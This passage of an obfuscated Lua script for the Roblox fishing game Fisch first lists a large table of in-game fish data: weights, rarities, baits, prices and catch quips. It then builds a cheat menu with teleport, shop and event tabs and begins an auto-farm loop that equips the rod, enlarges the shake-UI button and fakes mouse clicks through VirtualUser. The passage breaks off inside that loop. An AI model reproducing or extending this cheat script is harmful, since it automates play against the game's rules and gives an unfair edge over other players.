			Resilience = 55;
			Description = "A special and extremely rare breed of the Smallmouth Bass. They are extremely scarce in quantity, but they have slightly more haste and resilience than their cousins. Can be found alongside the Common Smallmouth Bass.";
			Hint = "Swims fiercely in freshwater alongside their cousin; the Smallmouth Bass.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Day";
			Price = 700;
			XP = 250;
			Seasons = {
				"Autumn"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"Now, where's the cymbol?",
				"A Golden Bass??",
				"Golden Bass!",
				"A Golden Smallmouth Bass!",
				"A Gold Bass!",
				"I usually wear silver.",
				"So shiny! A Golden Bass!"
			};
			SparkleColor = Color3.fromRGB(255, 205, 3);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Terrapin"
		};Oarfish = {
			WeightPool = {
				1500,
				2500
			};
			Chance = 0.01;
			Rarity = "Mythical";
			Resilience = 15;
			ProgressEfficiency = 0.7;
			Description = "The Oarfish is a massive, snake-like creatures that dwell in the deep ocean. they are often mistaken for sea serpents or mythical creatures. Their presence is considered an omen by many ancient cultures.";
			Hint = "???";
			FavouriteBait = "Squid";
			FavouriteTime = nil;
			Price = 4000;
			XP = 2000;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"WOAH! An Oarfish!",
				"I Caught an Oarfish!",
				"It's an Oarfish!"
			};
			SparkleColor = Color3.fromRGB(255, 51, 51);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Glacierfish = {
			WeightPool = {
				400,
				600
			};
			Chance = 0.02;
			Rarity = "Mythical";
			Resilience = 10;
			ProgressEfficiency = 0.85;
			Description = "Glacierfish are cold saltwater fish with large, broad bodies and a distinctive pink fin colouration. They are an extremely rare fish and can sometimes be a difficult catch for any angler. They can be found more commonly in Snowcap Caves during the night.";
			Hint = "Found in Snowcap Caves during the night. Big fan of the Truffle Worm.";
			FavouriteBait = "Truffle Worm";
			FavouriteTime = "Night";
			Price = 800;
			XP = 400;
			Seasons = {
				"None"
			};
			Weather = {
				"Rain",
				"Foggy"
			};
			Quips = {
				"A Glacierfish!",
				"I caught a Glacierfish!",
				"Woah, a Glacierfish!"
			};
			SparkleColor = Color3.fromRGB(161, 233, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};Sunfish = {
			WeightPool = {
				4000,
				10000
			};
			Chance = 1;
			Rarity = "Legendary";
			Resilience = 70;
			ProgressEfficiency = 0.4;
			Description = "Sunfish are the heaviest bony fish species alive today. Common sunfish can weigh up to one metric tonne but on rare instances they can way two metric tonnes! The largest appeal of the ocean Sunfish is the unsual shape of it's body and it's astonishing weight. Sunfish have the name for their love of basking in the sun by floating to the surface of the water.";
			Hint = "Caught near Sunstone Island and can sometimes weigh over 1,000 kg.";
			FavouriteBait = "None";
			FavouriteTime = "Day";
			Price = 1500;
			XP = 550;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"I think my backbone snapped..",
				"Woah!!",
				"OH MY! A SUNFISH?",
				"A sunfish!",
				"Woah, a Sunfish!",
				"Nice tan..",
				"How did I pull this up?",
				"A SUNFISH!"
			};
			SparkleColor = Color3.fromRGB(255, 232, 99);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Sunstone"
		};Moonfish = {
			WeightPool = {
				2500,
				5000
			};
			Chance = 0.2;
			Rarity = "Legendary";
			Resilience = 20;
			ProgressEfficiency = 0.6;
			Description = "The Moonfish is a sizable, flat, bony fish that inhabits deep and occasionally warm waters. While their behavior resembles that of the Ocean Sunfish, Moonfish are far more aggressive, using their rock-hard skulls to charge at fish, boats, and swimmers.";
			Hint = "???";
			FavouriteBait = "Minnow";
			FavouriteTime = "Night";
			Price = 1800;
			XP = 900;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"I think my backbone snapped..",
				"Woah!!",
				"OH MY! A MOONFISH?",
				"A Moonfish!!",
				"Woah, a Moonfish!!",
				"How did I pull this up?",
				"A Moonfish!!!"
			};
			SparkleColor = Color3.fromRGB(255, 122, 70);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Ocean"
		};["Great White Shark"] = {
			WeightPool = {
				7000,
				12000
			};
			Chance = 2;
			Rarity = "Mythical";
			Resilience = 8;
			ProgressEfficiency = 0.7;
			Description = "Great White Sharks are apex predators and will put up an intense fight when hooked. Their presence is often a sign of rich, diverse marine life in the area. Rare and challenging, they offer one of the biggest rewards for those skilled enough to catch them.";
			Hint = "Only rarely spotted in the oceans during a Shark Hunt.";
			FavouriteBait = "Fish Head";
			FavouriteTime = nil;
			Price = 6000;
			XP = 900;
			Seasons = {
				"Autumn"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"WOAH!! I CAUGHT A GREAT WHITE!",
				"A GREAT WHITE??",
				"HOLY.. A GREAT WHITE??",
				"I CAN'T FEEL MY SPINE!!"
			};
			SparkleColor = Color3.fromRGB(93, 123, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Ocean";
			Shark = true
		};["Dumbo Octopus"] = {
			WeightPool = {
				15,
				40
			};
			Chance = 0.1;
			Rarity = "Legendary";
			Resilience = 30;
			ProgressEfficiency = 0.85;
			Description = "The Dumbo Octopus is a deep-sea dweller, named for its ear like fins that resemble the ears of Disney's famous elephant character. With a soft, gelatinous body and gentle movements, it glides through the oceans and coral reefs of Roslit Bay.";
			Hint = "Caught in Roslit Bays coral reef.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 900;
			XP = 400;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"Woah, I caught a Dumbo!",
				"A Dumbo Octopus!",
				"No way! A Dumbo Octupus!"
			};
			SparkleColor = Color3.fromRGB(255, 142, 90);
			HoldAnimation = L_58_:WaitForChild("small");
			From = "Roslit"
		};["Pond Emperor"] = {
			WeightPool = {
				1000,
				2500
			};
			Chance = 0.05;
			Rarity = "Legendary";
			Resilience = 25;
			ProgressEfficiency = 0.6;
			Description = "Pond Emperors are highly territorial, powerful swimmers that will consume almost anything. Their striking coloration, aggressive nature, and rare appearances make them a prized and fortunate catch for anglers.";
			Hint = "Found in Snowcap Pond.";
			FavouriteBait = "Squid";
			FavouriteTime = nil;
			Price = 900;
			XP = 700;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Pond Emperor!",
				"WOAH! A Pond Emperor!!",
				"Pond Emperor!",
				"I caught a Pond Emperor!!"
			};
			SparkleColor = Color3.fromRGB(136, 39, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};Isonade = {
			WeightPool = {
				6000,
				13000
			};
			Chance = 0.1;
			Rarity = "Mythical";
			Resilience = 8;
			ProgressEfficiency = 0.5;
			Description = "The Isonade is a sinister creature that is assumed exctinct. They are seeming to be a dream that is possible to be caught and captured. They only circle near Strange Whirlpools, can they even sometimes can be the cause for one.";
			Hint = "Can be found when fishing in a strange whirlpool.";
			FavouriteBait = "Truffle Worm";
			FavouriteTime = nil;
			Price = 8000;
			XP = 1200;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"WOAH!! I CAUGHT AN ISONADE!",
				"AN ISONADE??",
				"HOLY.. AN ISONADE??",
				"I CAN'T FEEL MY SPINE!!",
				"THESE EXIST?"
			};
			SparkleColor = Color3.fromRGB(47, 29, 106);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Vertigo"
		};["Great Hammerhead Shark"] = {
			WeightPool = {
				2300,
				5000
			};
			Chance = 2;
			Rarity = "Mythical";
			Resilience = 20;
			ProgressEfficiency = 0.65;
			Description = "The Great Hammerhead Shark is a large, powerful predator known for its distinct hammer-shaped head. Its unique head shape improves its ability to track prey, making it a formidable hunter in the ocean, and a prominent catch amung anglers.";
			Hint = "Only rarely spotted in the oceans during a Shark Hunt. Only awake during the day.";
			FavouriteBait = "Fish Head";
			FavouriteTime = "Day";
			Price = 5500;
			XP = 860;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Windy"
			};
			Quips = {
				"WOAH!! I CAUGHT A GREAT HAMMERHEAD!",
				"A GREAT HAMMERHEAD??",
				"HOLY.. A GREAT HAMMERHEAD??",
				"I CAN'T FEEL MY SPINE!!",
				"HAMMERTIME!",
				"Comically large hammer head!!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Ocean";
			Shark = true
		};Wiifish = {
			WeightPool = {
				200,
				400
			};
			Chance = 1;
			Rarity = "Legendary";
			Resilience = 40;
			ProgressEfficiency = 0.8;
			Description = "The Wiifish is a legendary tropic fish that can only be found in the saltwaters Sunstone Island during the day. They are an extremely old fish, dating back over 230,000,000 years ago. While the Wiifish is a slow swimmer, they can put up an immense fight for even advanced anglers.";
			Hint = "Found rarely near Sunstone Island during the day.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 1200;
			XP = 500;
			Seasons = {
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah, a Wiifish!",
				"This thing is super ancient!",
				"A Wiifish!!",
				"This brings me back!"
			};
			SparkleColor = Color3.fromRGB(255, 136, 51);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Sunstone"
		};Dolphin = {
			WeightPool = {
				1500,
				2000
			};
			Chance = 0.5;
			Rarity = "Legendary";
			Resilience = 5;
			ProgressEfficiency = 0.95;
			Description = "The Dolphin is a playful, intelligent marine mammal known for its sleek body, curved dorsal fin, and high intelligence. Dolphins are fast swimmers, known for jumping out of the water in graceful arcs and interacting with boats and swimmers. Found in the ocean.";
			Hint = "Found in the ocean.";
			FavouriteBait = "None";
			FavouriteTime = "Day";
			Price = 1200;
			XP = 600;
			Seasons = {
				"Summer",
				"Spring"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"I caught a Dolphin!",
				"It's a Dolphin!",
				"A DOLPHINN!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("heavybasic");
			From = "Ocean"
		};Sawfish = {
			WeightPool = {
				4000,
				6000
			};
			Chance = 0.7;
			Rarity = "Legendary";
			Resilience = 10;
			Description = "The Sawfish is a large, unique fish with a long, flattened snout that is lined with sharp teeth, resembling a saw. They are found all across the ocean mostly during the night.";
			Hint = "found all around the ocean during the night.";
			FavouriteBait = "Fish Head";
			FavouriteTime = "Night";
			Price = 1500;
			XP = 900;
			Seasons = {
				"Autumn"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Sawfish!",
				"Chainsawfish!",
				"I caught a Sawfish!",
				"Woah, a Sawfish!"
			};
			SparkleColor = Color3.fromRGB(161, 199, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Ocean"
		};["Mythic Fish"] = {
			WeightPool = {
				6,
				14
			};
			Chance = 0.01;
			Rarity = "Mythical";
			Resilience = 40;
			ProgressEfficiency = 0.4;
			Description = "The Mythic Fish is an extremely rare and beautiful fish. They swim gracefully in couples of two near the surface of the ocean water. They seem weak, but they can oddly put up a strong fight when being caught. This is due to the other Mythic Fish attempting to aid it's partner by pulling it off the hook.";
			Hint = "Found in the Ocean.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Day";
			Price = 2000;
			XP = 800;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Oh no.. Where is it's partner?",
				"A Mythic Fish!!",
				"I Caught a Mythic Fish!!!",
				"NO WAY! A Mythic Fish!"
			};
			SparkleColor = Color3.fromRGB(255, 199, 32);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Rabbitfish = {
			WeightPool = {
				25,
				60
			};
			Chance = 1;
			Rarity = "Legendary";
			Resilience = 35;
			ProgressEfficiency = 0.8;
			Description = "The Rabbitfish is an illusive saltwater fish that is only found under The Arch. They are odd creatures that both resemble a rabbit, and swim in a pattern similar to a bunny jumping.";
			Hint = "Found under The Arch.";
			FavouriteBait = "Seaweed";
			FavouriteTime = nil;
			Price = 1100;
			XP = 800;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah!! A Rabbitfish!",
				"A Rabbit!!",
				"I caught a Rabbitfish!"
			};
			SparkleColor = Color3.fromRGB(204, 142, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};["Umbral Shark"] = {
			WeightPool = {
				1050,
				1550
			};
			Chance = 0.01;
			Rarity = "Legendary";
			Resilience = 10;
			ProgressEfficiency = 0.9;
			Description = "Umbral Sharks are a nocturnal bottom feeder, spending most of their time on the floor or in small crevices. They are gentle and slow-moving until provoked. Once angered, they can be extremely strong swimmers and often will break fishing lines. They are extremely rare, as they don't often come high enough in the water for anyone to see.";
			Hint = "Caught at night in Keepers Altar.";
			FavouriteBait = "Fish Head";
			FavouriteTime = "Night";
			Price = 1000;
			XP = 500;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"An Umbral Shark!",
				"Woah! An Umbral Shark!",
				"I Caught an Umbral Shark!"
			};
			SparkleColor = Color3.fromRGB(151, 110, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Keepers Altar"
		};Ringle = {
			WeightPool = {
				1,
				4
			};
			Chance = 0.01;
			Rarity = "Mythical";
			Resilience = 80;
			ProgressEfficiency = 0.5;
			Description = "The Ringle is an interesting and illusive fish that swims at extremely low and cold depths. They have a Rhino-like horn that they use to attack their prey. Most commonly found in the open ocean of Snowcap Island.";
			Hint = "Found in the open ocean of Snowcap Island during the night.";
			FavouriteBait = "Bagel";
			FavouriteTime = "Night";
			Price = 900;
			XP = 500;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear",
				"Foggy"
			};
			Quips = {
				"A Ringle!",
				"I caught a Ringle!",
				"A Ringle!!",
				"Woah, an Ringle!"
			};
			SparkleColor = Color3.fromRGB(87, 224, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};Olm = {
			WeightPool = {
				1,
				4
			};
			Chance = 2;
			Rarity = "Legendary";
			Resilience = 80;
			ProgressEfficiency = 0.95;
			Description = "The Olm is an aquatic salamander which is an exclusively cave-dwelling species. The olm is mostly found in dark and moist areas of freshwater. They are most notable for their adaptations to a life of darkness with-in their caves. The Olm has severely under underdeveloped eyes, leaving it blind. This blindness gives them an acute sense of smell and hearing.";
			Hint = "Reisdes on the floor of caves and dark rocky areas. Loves the night.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Night";
			Price = 900;
			XP = 500;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear",
				"Foggy"
			};
			Quips = {
				"An Olm!",
				"I caught an Olm!",
				"Olm.. my gosh!",
				"An Olm!!",
				"Woah, an Olm!",
				"This ain't no Axolotl..",
				"It looks like a recorder"
			};
			SparkleColor = Color3.fromRGB(255, 178, 178);
			HoldAnimation = L_58_:WaitForChild("tiny");
			ViewportSizeOffset = 2;
			From = "Terrapin"
		};["Sea Pickle"] = {
			WeightPool = {
				4,
				10
			};
			Chance = 0.01;
			Rarity = "Mythical";
			Resilience = 50;
			Description = "The Sea Pickle is a quirky, small, tube-like sea creature found on ocean beds. Its glowing green body gives off a faint bioluminescent light, making it easy to spot at night. It's know to wriggle out of nets and rods, making it a tricky catch. Despite its unassuming appearance, it's highly valued for its oddity and unique glow.";
			Hint = "Found in the ocean. Can be caught in rods and cages.";
			FavouriteBait = "Seaweed";
			FavouriteTime = "Night";
			Price = 2000;
			XP = 60;
			Seasons = {
				"Autunn",
				"Summer"
			};
			Weather = {
				"Clear",
				"Cloudy"
			};
			Quips = {
				"A SEA PICKLE!!",
				"I CAUGHT A SEA PICKLE!",
				"A Sea pickle!"
			};
			SparkleColor = Color3.fromRGB(121, 255, 80);
			HoldAnimation = L_58_:WaitForChild("small");
			From = "Ocean"
		};["Crown Bass"] = {
			WeightPool = {
				20,
				60
			};
			Chance = 0.2;
			Rarity = "Legendary";
			Resilience = 20;
			ProgressEfficiency = 0.8;
			Description = "The Crown Bass is a special type of bass that is known for its vibrant colours, and its luminescent 'crown' on its head. They use this crown to attract prey, and see easily at night. They can be found all over the world in all sorts of salt waters, especially warmer waters during the night.";
			Hint = "In salt waters during the night. ";
			FavouriteBait = "Squid";
			FavouriteTime = "Night";
			Price = 1200;
			XP = 700;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Crown Bass!",
				"I caught a Crown Bass!",
				"Woah! A Crown Bass!",
				"Ouu! A Crown Bass!"
			};
			SparkleColor = Color3.fromRGB(203, 163, 70);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};["Whisker Bill"] = {
			WeightPool = {
				350,
				1000
			};
			Chance = 0.01;
			Rarity = "Mythical";
			Resilience = 25;
			ProgressEfficiency = 0.8;
			Description = "The Whisker Bill is a mythical creature that was a popular staple of Moosewood Island before they were thought to be excinct. Whisker Bills are extremely strong, however are awkward swimmers due to their peculiar archetype.";
			Hint = "???";
			FavouriteBait = "Truffle Worm";
			FavouriteTime = nil;
			Price = 3100;
			XP = 150;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"The mythical Whisker Bill..",
				"Woah.. A Whisker Bill..",
				"I caught.. A Whisker Bill..",
				"Woah..."
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Moosewood"
		};["Colossal Squid"] = {
			WeightPool = {
				7000,
				12000
			};
			Chance = 0.02;
			Rarity = "Mythical";
			Resilience = 5;
			ProgressEfficiency = 0.3;
			Description = "The Colossal Squid is a massive, deep-sea creature with enormous tentacles and large appetite for anglers. Known for its incredible size and strength, it lurks in the deepest parts of the ocean, only occasionally venturing near the surface during the nights.";
			Hint = "???";
			FavouriteBait = "None";
			FavouriteTime = "Night";
			Price = 6500;
			XP = 3000;
			Seasons = {
				"None"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"WOAH. A COLOSSAL SQUID!!",
				"MY BACCKK",
				"I CAN'T BELIEVE IT! COLOSSAL SQUID!"
			};
			SparkleColor = Color3.fromRGB(255, 82, 82);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Ocean"
		};["Rubber Ducky"] = {
			WeightPool = {
				1,
				7
			};
			Chance = 0.01;
			Rarity = "Legendary";
			Resilience = 100;
			ProgressEfficiency = 0.3;
			Description = "A simple, squeezable, rubber duck! It may have been lost in one of the deepest parts of our discovered world... But, it's in great condition!";
			Hint = "???";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 900;
			XP = 800;
			Seasons = {
				"None"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A.. Rubber Duck..?",
				"Woah!.. A Ducky??",
				"Awesome!!!!!!!",
				"Did someone lose this?",
				"How did this get down here..?"
			};
			SparkleColor = Color3.fromRGB(255, 234, 115);
			HoldAnimation = L_58_:WaitForChild("small");
			From = "Vertigo"
		};["Enchant Relic"] = {
			WeightPool = {
				210,
				210
			};
			Chance = 0.2;
			Rarity = "Relic";
			Resilience = 35;
			ProgressEfficiency = 0.8;
			Description = "A stone filled with the blessing of a Divine Lantern Keeper.. Returning it to it's throne under the Statue of Sovereignty will result in your currently equipped rod being engulfed in its power.";
			Hint = "???";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 3500;
			XP = 800;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"I feel it's power..",
				"Woah.. A Relic??",
				"A Relic!!",
				"I caught a Relic!"
			};
			SparkleColor = Color3.fromRGB(126, 255, 216);
			HoldAnimation = L_58_:WaitForChild("small");
			From = "None"
		};Ghoulfish = {
			WeightPool = {
				45,
				120
			};
			Chance = 0.1;
			Rarity = "Event";
			Resilience = 30;
			ProgressEfficiency = 0.9;
			Description = "The Ghoulfish is known for its eerie appearance. They only appear during FischFright season, and are a scary bie to have on the end of your rod.";
			Hint = "Only can be caught during FischFright.";
			FavouriteBait = "Squid";
			FavouriteTime = nil;
			Price = 1000;
			XP = 600;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Ghoulfish!",
				"I caught a Ghoulfish!",
				"Woah! A Ghoulfish!",
				"Ouu! A Ghoulfish!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("basic")
		};Lurkerfish = {
			WeightPool = {
				5,
				20
			};
			Chance = 0.01;
			Rarity = "Event";
			Resilience = 20;
			ProgressEfficiency = 0.9;
			Description = "The Lurkerfish is an interesting breed of the Anglerfish that is only visible during FischFright. It is said this fish gains its visible body from the though of FischFight, and during the rest of the year, the Lurkerfish is completely invisible to the untrained eye.";
			Hint = "Only can be caught during FischFright.";
			FavouriteBait = "Squid";
			FavouriteTime = nil;
			Price = 1500;
			XP = 800;
			Seasons = {
				"Winter",
				"Autumn"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"Woah, a Lurkerfish!",
				"No way! A Lurkerfish!",
				"I caught a Lurkerfish!"
			};
			SparkleColor = Color3.fromRGB(140, 255, 176);
			HoldAnimation = L_58_:WaitForChild("small")
		};["Candy Fish"] = {
			WeightPool = {
				5,
				10
			};
			Chance = 10;
			Rarity = "Event";
			Resilience = 50;
			Description = "The Candy Fisch is a vibrant, brighlt colored fish, formed from glucose and carbon. Known for their playful nature, and sweet gummy texture. Only can be caught during FischFright.";
			Hint = "Only can be caught during FischFright.";
			FavouriteBait = "Flakes";
			FavouriteTime = nil;
			Price = 200;
			XP = 400;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Woah, a Candy Fisch!",
				"No way! A Candy Fisch!",
				"I caught a Candy Fisch!"
			};
			SparkleColor = Color3.fromRGB(255, 51, 51);
			HoldAnimation = L_58_:WaitForChild("small")
		};Zombiefish = {
			WeightPool = {
				15,
				30
			};
			Chance = 10;
			Rarity = "Event";
			Resilience = 50;
			Description = "Once a lifeless fish drifting to the surface, the Zombiefish was struck by lightning and brought back to life. Now reanimated, it prowls the waters during FischFright, haunting the tides with its undead presence.";
			Hint = "Only can be caught during FischFright.";
			FavouriteBait = "Flakes";
			FavouriteTime = nil;
			Price = 200;
			XP = 400;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Woah, a Candy Fisch!",
				"No way! A Candy Fisch!",
				"I caught a Candy Fisch!"
			};
			SparkleColor = Color3.fromRGB(255, 51, 51);
			HoldAnimation = L_58_:WaitForChild("small")
		};Skelefish = {
			WeightPool = {
				5,
				10
			};
			Chance = 10;
			Rarity = "Event";
			Resilience = 50;
			Description = "The Skelefish is a literal fish skeleton, eerily animated as if it still had flesh. Its bony structure drifts through the water, with jagged, rib-like bones and a hollow skull that stares blankly ahead. Only can be caught during FischFright.";
			Hint = "Only can be caught during FischFright.";
			FavouriteBait = "Fish Head";
			FavouriteTime = nil;
			Price = 200;
			XP = 400;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Woah, a Skelefish!",
				"No way! A Skelefish!",
				"I caught a Skelefish!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny")
		};Nessie = {
			WeightPool = {
				20000,
				40000
			};
			Chance = 0.01;
			Rarity = "Event";
			Resilience = 5;
			ProgressEfficiency = 0.2;
			Description = "Nessie is thought to be a complete myth. Little did these anglers know, you found the impossible catch... Nessie... Only obtainable during FischFright ";
			Hint = "Only obtainable during FischFright";
			FavouriteBait = "Truffle Worm";
			FavouriteTime = "Night";
			Price = 6500;
			XP = 3000;
			Seasons = {
				"None"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"WOAH, NESSIE!?!",
				"MY BACCKK",
				"I CAN'T BELIEVE IT! NESSIE!",
				"I DIDN'T THINK IT WAS REAL!!"
			};
			SparkleColor = Color3.fromRGB(129, 255, 181);
			HoldAnimation = L_58_:WaitForChild("heavy")
		};Rarities = {
			"Trash",
			"Common",
			"Uncommon",
			"Unusual",
			"Rare",
			"Legendary",
			"Mythical",
			"Event",
			"Relic",
			"Divine"
		};RarityColours = {
			Trash = Color3.fromRGB(145, 145, 145);
			Common = Color3.fromRGB(142, 187, 191);
			Uncommon = Color3.fromRGB(161, 255, 169);
			Unusual = Color3.fromRGB(192, 135, 198);
			Rare = Color3.fromRGB(119, 108, 181);
			Legendary = Color3.fromRGB(240, 181, 109);
			Mythical = Color3.fromRGB(255, 62, 120);
			Event = Color3.fromRGB(54, 73, 159);
			Divine = Color3.fromRGB(202, 198, 255);
			Relic = Color3.fromRGB(120, 255, 183)
		}}
end;
local L_8_ = {
	General = L_7_:AddTab({
		Title = "Generals",
		Icon = "box"
	}),
	Event = L_7_:AddTab({
		Title = "Event",
		Icon = "star"
	}),
	Player = L_7_:AddTab({
		Title = "Player",
		Icon = "user"
	}),
	Shop = L_7_:AddTab({
		Title = "Shopee",
		Icon = "shopping-bag"
	}),
	Configs = L_7_:AddTab({
		Title = "Configs",
		Icon = "diamond"
	}),
	Teleport = L_7_:AddTab({
		Title = "Teleport",
		Icon = "asterisk"
	}),
	Settings = L_7_:AddTab({
		Title = "Settings",
		Icon = "settings"
	})
}
Toggle = function(L_59_arg0, L_60_arg1, L_61_arg2, L_62_arg3, L_63_arg4, ...)
	local L_64_ = {
		...
	}
	L_62_arg3 = L_62_arg3 or L_60_arg1;
	local L_65_ = Config[L_62_arg3] or false;
	local L_66_ = L_59_arg0:AddToggle((L_60_arg1 or L_60_arg1 .. "-toggle"), {
		Title = L_60_arg1 or "null",
		Default = L_65_,
		Description = L_61_arg2 or ""
	})
	L_66_:OnChanged(function(L_67_arg0)
		Config[L_62_arg3] = L_67_arg0;
		save()
		if L_63_arg4 then
			L_63_arg4(L_67_arg0)
		else
			if AllFuncs[L_62_arg3] then
				local L_68_ = task.spawn(AllFuncs[L_62_arg3])
				if not L_67_arg0 and L_68_ then
					task.cancel(L_68_)
				end
			end
		end
	end)
	return L_66_
end;
Slider = function(L_69_arg0, L_70_arg1, L_71_arg2, L_72_arg3, L_73_arg4, ...)
	local L_74_, L_75_ = ...
	if not L_75_ and type(L_74_) == "function" then
		L_75_ = L_74_
	end;
	if not L_74_ then
		L_74_ = L_70_arg1
	end;
	local L_76_ = Config[L_74_]
	local L_77_ = L_69_arg0:AddSlider((L_70_arg1 or L_70_arg1 .. "-slider"), {
		Title = L_70_arg1 or "null",
		Min = L_71_arg2 or 0,
		Max = L_72_arg3 or 1,
		Default = (Config[L_74_] or L_76_) or L_71_arg2,
		Rounding = (L_73_arg4 == true and 1) or 0
	})
	L_77_:OnChanged(function(L_78_arg0)
		save()
		Config[L_74_] = L_78_arg0
	end)
	task.wait()
	return L_77_
end;
TextBox = function(L_79_arg0, L_80_arg1, L_81_arg2, L_82_arg3, L_83_arg4, ...)
	local L_84_, L_85_ = ...
	if not L_85_ and type(L_84_) == "function" then
		L_85_ = L_84_
	end;
	if not L_84_ then
		L_84_ = L_80_arg1
	end;
	local L_86_ = L_79_arg0:AddInput((L_80_arg1 or L_80_arg1 .. "-input"), {
		Title = L_80_arg1 or "Null",
		Placeholder = L_82_arg3 or "Put text here!",
		Numeric = L_83_arg4 or false,
		Finished = true,
		Description = L_81_arg2 or "",
		Default = Config[L_84_]
	})
	L_86_:OnChanged(function(L_87_arg0)
		Config[L_84_] = L_87_arg0;
		save()
	end)
	task.wait()
	return L_86_
end;
Dropdown = function(L_88_arg0, L_89_arg1, L_90_arg2, L_91_arg3, L_92_arg4, ...)
	local L_93_, L_94_ = ...
	if not L_94_ and type(L_93_) == "function" then
		L_94_ = L_93_
	end;
	L_93_ = L_93_ or L_89_arg1;
	if L_92_arg4 then
		L_90_arg2 = (L_90_arg2 or Config[L_93_]) or {}
		if type(Config[L_93_]) == "string" then
			Config[L_93_] = {
				Config[L_93_]
			}
		end
	else
		L_90_arg2 = (L_90_arg2 or Config[L_93_]) or ""
	end;
	local L_95_ = L_88_arg0:AddDropdown((L_89_arg1 or L_89_arg1 .. "-dropdown"), {
		Title = L_89_arg1 or "Null",
		Values = L_91_arg3 or {
			"None"
		},
		Multi = L_92_arg4 or false,
		Default = L_90_arg2
	})
	L_95_:OnChanged(function(L_96_arg0)
		if L_92_arg4 and type(L_96_arg0) == 'table' then
			Config[L_93_] = {}
			for L_97_forvar0, L_98_forvar1 in pairs(L_96_arg0) do
				table.insert(Config[L_93_], L_98_forvar1)
			end
		else
			Config[L_93_] = L_96_arg0
		end;
		save()
		if L_94_ then
			L_94_(L_96_arg0)
		end
	end)
	return L_95_
end;
AllFuncs['Farm Fish'] = function()
	local L_99_ = ReplicatedStorage.playerstats[LocalPlayer.Name].Stats.rod.Value;
	while Config['Farm Fish'] and task.wait() do
		if Backpack:FindFirstChild(L_99_) then
			LocalPlayer.Character.Humanoid:EquipTool(Backpack:FindFirstChild(L_99_))
		end;
		if LocalPlayer.Character:FindFirstChild(L_99_) and LocalPlayer.Character:FindFirstChild(L_99_):FindFirstChild("bobber") then
			local L_100_ = game:GetService("ReplicatedStorage").resources.items.items.GPS.GPS.gpsMain.xyz:Clone()
			L_100_.Parent = game.Players.LocalPlayer.PlayerGui:WaitForChild("hud"):WaitForChild("safezone"):WaitForChild("backpack")
			L_100_.Name = "Lure"
			L_100_.Text = "<font color='#ff4949'>Lure </font>: 0%"
			repeat
				pcall(function()
					PlayerGui:FindFirstChild("shakeui").safezone:FindFirstChild("button").Size = UDim2.new(1001, 0, 1001, 0)
					game:GetService("VirtualUser"):Button1Down(Vector2.new(1, 1))
					game:GetService("VirtualUser"):Button1Up(Vector2.new(1, 1))
				end)
